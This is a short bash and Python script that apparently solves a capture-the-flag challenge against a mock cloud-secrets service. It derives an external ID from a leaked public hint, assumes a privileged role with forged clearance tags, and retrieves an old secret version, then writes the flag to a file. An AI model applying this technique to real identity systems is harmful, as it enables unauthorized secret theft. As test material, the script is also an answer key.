#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PY'
import hashlib, json, time, urllib.request
from pathlib import Path
BASE = "http://target:8101"
def call(path, value=None):
    data = None if value is None else json.dumps(value).encode()
    req = urllib.request.Request(BASE + path, data=data, headers={"content-type":"application/json"})
    for attempt in range(40):
        try:
            with urllib.request.urlopen(req, timeout=3) as response: return json.load(response)
        except Exception:
            if attempt == 39: raise
            time.sleep(.25)
public = call("/public")
external = hashlib.sha256((public["trust_hint"] + ":" + public["caller"]).encode()).hexdigest()[:12]
tags = {"project":"helios", "clearance":"restricted"}
assumed = call("/assume", {"role":"audit-bridge", "external_id":external, "tags":tags})
result = call("/secret", {"token":assumed["token"], "resource":"arn:cyber:secrets:us-test-1:424242:secret/helios-audit",
                          "version":"AWSPREVIOUS", "source_vpc":"vpc-audit"})
Path("/app/flags.txt").write_text(result["flag"] + "\n")
Path("/app/evidence.json").write_text(json.dumps(result["receipt"], indent=2, sort_keys=True) + "\n")
PY
